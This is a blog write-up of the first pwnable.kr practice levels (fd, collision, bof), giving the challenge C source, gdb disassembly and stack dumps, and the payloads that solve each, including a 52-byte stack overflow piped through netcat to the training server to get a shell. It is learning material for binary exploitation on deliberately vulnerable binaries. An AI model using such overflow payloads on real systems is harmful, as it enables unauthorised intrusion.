---
title: "Pwnable.kr: A journey through the land of binary exploitation." 
date: 2021-02-15 00:25:00 -0600
categories: [WriteUps, pwnable.kr]
tags: [binexp]     # TAG names should always be lowercase
---

In these series of blog posts, I will attempt to solve most levels of pwnable.kr as part of my plan to learn more about Binary analysis and exploitation.

Pwnable.kr has 4 levels of difficulties: Toddler's Bottle, Rookis, Grotesque and Hacker's Secret.
This first post will contain the first 5 levels (Toddler's Bottle levels): fd, collision, bof, flag and passcode.

Here goes nothing !

## fd

The Toddler's Bottle levels are meant to make you comfortable with the basics of C,ELF,Linux ... and fd is a good start.

{% highlight c %}
 
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 char buf[32];
 int main(int argc, char* argv[], char* envp[]){
        if(argc<2){
                printf("pass argv[1] a number\n");
                return 0;
        }
        int fd = atoi( argv[1] ) - 0x1234;
        int len = 0;
        len = read(fd, buf, 32);
        if(!strcmp("LETMEWIN\n", buf)){
                printf("good job :)\n");
                system("/bin/cat flag");
                exit(0);
        }
        printf("learn about Linux file IO\n");
        return 0;

 }

{% endhighlight %}
We are provided with the source code and the binary. The program basically takes a number as an argument then converts it to an int (from char) and subtracts 0x1234 (4660). 
What does it do with the argument after that ? It serves as the first argument to read().
But what does that mean ? Let's look at the manual of read().

```
read - read from a file descriptor

ssize_t read(int fd, void *buf, size_t count);

read() attempts to read up to count bytes from file descriptor 'fd' into the buffer starting at buf.
```

What is a file descriptor though ?  In C, when handling files or input/output resources we use three integers that represent input, output and errors.

- stdin (standard input) file descriptor is 0
- stdout (standard output) is 1
- stderr (standard error) is 2

So what we want to do is make fd 0 (stdin) so we can give some input and pass LETMEWIN to solve the challenge. Let's try to pass 4660 as the argument then LETMEPASS and see what happens.


```
fd@pwnable:~$ ./fd 4660
LETMEWIN
***************************
```

We get flag !!


## collision

we start by looking into the source code of collision.

{% highlight c %}

  #include <stdio.h>
  #include <string.h>
  unsigned long hashcode = 0x21DD09EC;
  unsigned long check_password(const char* p){
          int* ip = (int*)p;
          int i;
          int res=0;
          for(i=0; i<5; i++){
                  res += ip[i];
          }
          return res;
  }

  int main(int argc, char* argv[]){
          if(argc<2){
                  printf("usage : %s [passcode]\n", argv[0]);
                  return 0;
          }
          if(strlen(argv[1]) != 20){
                  printf("passcode length should be 20 bytes\n");
                  return 0;
          }

          if(hashcode == check_password( argv[1] )){
                  system("/bin/cat flag");
                  return 0;
          }
          else
                  printf("wrong passcode.\n");
          return 0;
  }

{% endhighlight %}

What does the program do ?  It basically takes an argument (20 bytes), converts every 4 bytes to an int and adds it all together. If the sum is 0x21DD09EC we get the flag.

So we can approach this by dividing 0x21DD09EC by 5 but it's not dividable so we divide by 4 and add the remainder. After converting it to decimal and doing some basic math we come up with this: 568134124 = 4 x 113626824 + 113626828.

4 x 4 bytes of 113626824 (0x06C5CEC8) then 4 bytes of 113626828 (0x06C5CECC).

So our payload is going to be : 
```./col $(python -c "print '\xc8\xce\xc5\x06'*4+'\xcc\xce\xc5\x06'")```
(don't forget the endianess :) )

And we get flag !!

## bof

Buffer Overflows. Many hate hearing it and some even fear it. It's easy stuff once you get the hang of it so let's overflow some buffers.

{% highlight c %}

  #include <stdio.h>
  #include <string.h>
  #include <stdlib.h>
  void func(int key){
          char overflowme[32];
          printf("overflow me : ");
          gets(overflowme);       // smash me!
          if(key == 0xcafebabe){
                  system("/bin/sh");
          }
          else{
                  printf("Nah..\n");
          }
  }
  int main(int argc, char* argv[]){
          func(0xdeadbeef);
          return 0;
  }
{% endhighlight %}

This one is rather simple. Overflow the buffer and overwrite 'key' with 0xcafebabe.
 
let's run it in gdb and disassemble 'func'.

```
gef➤  disassemble func
Dump of assembler code for function func:
   0x5655562c <+0>:	push   ebp
   0x5655562d <+1>:	mov    ebp,esp
   0x5655562f <+3>:	sub    esp,0x48
   0x56555632 <+6>:	mov    eax,gs:0x14
   0x56555638 <+12>:	mov    DWORD PTR [ebp-0xc],eax
   0x5655563b <+15>:	xor    eax,eax
   0x5655563d <+17>:	mov    DWORD PTR [esp],0x78c
   0x56555644 <+24>:	call   0x56555645 <func+25>
   0x56555649 <+29>:	lea    eax,[ebp-0x2c]
   0x5655564c <+32>:	mov    DWORD PTR [esp],eax
   0x5655564f <+35>:	call   0x56555650 <func+36>
   0x56555654 <+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x5655565b <+47>:	jne    0x5655566b <func+63>
   0x5655565d <+49>:	mov    DWORD PTR [esp],0x79b
   0x56555664 <+56>:	call   0x56555665 <func+57>
   0x56555669 <+61>:	jmp    0x56555677 <func+75>
   0x5655566b <+63>:	mov    DWORD PTR [esp],0x7a3
   0x56555672 <+70>:	call   0x56555673 <func+71>
   0x56555677 <+75>:	mov    eax,DWORD PTR [ebp-0xc]
   0x5655567a <+78>:	xor    eax,DWORD PTR gs:0x14
   0x56555681 <+85>:	je     0x56555688 <func+92>
   0x56555683 <+87>:	call   0x56555684 <func+88>
   0x56555688 <+92>:	leave
   0x56555689 <+93>:	ret
End of assembler dump.
gef➤
```

The comarison happens at ebp+0x8 
```
cmp    DWORD PTR [ebp+0x8],0xcafebabe). That's what we want to overwrite with 0xcafebabe.
```
Let's set a break point at that instruction. Then run and give it 100 bytes and see if we hit ebp+8.

```
gef➤  r <<< $(python2 -c "print 'a'*100")
Starting program: /home/kin/pwnable.kr/bof <<< $(python2 -c "print 'a'*100")
overflow me :

Breakpoint 1, 0x56555654 in func ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffd33c  →  "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[...]"
$ebx   : 0x0
$ecx   : 0xf7f83540  →  0xfbad2088
$edx   : 0xfbad2088
$esp   : 0xffffd320  →  0xffffd33c  →  "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[...]"
$ebp   : 0xffffd368  →  "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[...]"
$esi   : 0xf7f82e1c  →  0x001edd2c
$edi   : 0xf7f82e1c  →  0x001edd2c
$eip   : 0x56555654  →  <func+40> cmp DWORD PTR [ebp+0x8], 0xcafebabe
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd320│+0x0000: 0xffffd33c  →  "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[...]"     ← $esp
0xffffd324│+0x0004: 0x00000000
0xffffd328│+0x0008: 0xf7ffcfcc  →  0x0002cf04
0xffffd32c│+0x000c: 0x00000000
0xffffd330│+0x0010: 0x00000000
0xffffd334│+0x0014: 0x56555530  →  <_start+0> xor ebp, ebp
0xffffd338│+0x0018: 0x00001000
0xffffd33c│+0x001c: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[...]"
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
   0x56555647 <func+27>        mov    esp, DWORD PTR [ecx-0x762bba73]
   0x5655564d <func+33>        add    al, 0x24
   0x5655564f <func+35>        call   0xf7e05880 <gets>
●→ 0x56555654 <func+40>        cmp    DWORD PTR [ebp+0x8], 0xcafebabe
   0x5655565b <func+47>        jne    0x5655566b <func+63>
   0x5655565d <func+49>        mov    DWORD PTR [esp], 0x5655579b
   0x56555664 <func+56>        call   0xf7dda6e0 <system>
   0x56555669 <func+61>        jmp    0x56555677 <func+75>
   0x5655566b <func+63>        mov    DWORD PTR [esp], 0x565557a3
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "bof", stopped 0x56555654 in func (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x56555654 → func()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/x $ebp+8
0xffffd370:     0x61616161
gef➤
```

Ahah! we did. Now we use Metasploit's pattern_create and pattern_offset to determine the offset and we get: 52.

So our payload is gonna be : 52 x 'a' + 0xcafebabe. (little endianess reminder :) )

```
[kin@natsukashii pwnable.kr]$ python2 -c "print 'a'*52+'\xbe\xba\xfe\xca'" > payload
[kin@natsukashii pwnable.kr]$ cat payload - | nc pwnable.kr 9000
ls
bof
bof.c
flag
log
log2
super.pl
```

We get flag !!

